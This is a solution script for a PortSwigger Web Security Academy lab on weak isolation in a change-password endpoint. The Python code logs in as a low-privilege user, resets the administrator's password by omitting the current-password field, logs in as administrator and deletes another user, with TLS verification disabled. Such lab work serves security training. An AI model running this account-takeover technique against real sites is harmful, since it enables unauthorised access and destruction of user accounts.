# Lab: Weak isolation on dual-use endpoint

Link to lab: https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-weak-isolation-on-dual-use-endpoint

## Solution

```python
import requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
from bs4 import BeautifulSoup

sess = requests.Session()

# Get login

response = requests.get('https://0a19001303040aedc0ac4a970098001d.web-security-academy.net/login')

soup = BeautifulSoup(response.text, 'html.parser')
csrf = soup.find('input', {'name': 'csrf'})['value']
session = response.headers['Set-Cookie'].split(';')[0].split('=')[1]

# Post login

cookies = {
    'session': session,
}

data = {
    'csrf': csrf,
    'username': 'wiener',
    'password': 'peter',
}

response = requests.post(
    'https://0a19001303040aedc0ac4a970098001d.web-security-academy.net/login',
    cookies=cookies,
    data=data,
    verify=False,
    allow_redirects=False,
)
print(response.text)
session = response.headers['Set-Cookie'].split(';')[0].split('=')[1]
cookies = {
    'session': session,
}

# Get my account page

response = requests.get(
    'https://0a19001303040aedc0ac4a970098001d.web-security-academy.net/my-account',
    cookies=cookies,
    verify=False,
)

soup = BeautifulSoup(response.text, 'html.parser')
csrf = soup.find('input', {'name': 'csrf'})['value']

# Post change password

data = {
    'csrf': csrf,
    'username': 'administrator',
    'new-password-1':'peter',
    'new-password-2':'peter',
}

response = requests.post(
    'https://0a19001303040aedc0ac4a970098001d.web-security-academy.net/my-account/change-password',
    cookies=cookies,
    data=data,
    verify=False,
)

# Get logout

response = requests.get(
    'https://0a19001303040aedc0ac4a970098001d.web-security-academy.net/logout',
    cookies=cookies,
    verify=False,
)

# Get login

response = requests.get('https://0a19001303040aedc0ac4a970098001d.web-security-academy.net/login')

soup = BeautifulSoup(response.text, 'html.parser')
csrf = soup.find('input', {'name': 'csrf'})['value']

# Post login


data = {
    'csrf': csrf,
    'username': 'administrator',
    'password': 'peter',
}

response = requests.post(
    'https://0a19001303040aedc0ac4a970098001d.web-security-academy.net/login',
    cookies=cookies,
    data=data,
    verify=False,
    allow_redirects=False
)
session = response.headers['Set-Cookie'].split(';')[0].split('=')[1]
cookies = {
    'session': session,
}

# Delete user carlos
response = requests.get(
    'https://0a19001303040aedc0ac4a970098001d.web-security-academy.net/admin/delete?username=carlos',
    cookies=cookies,
    verify=False,
)
```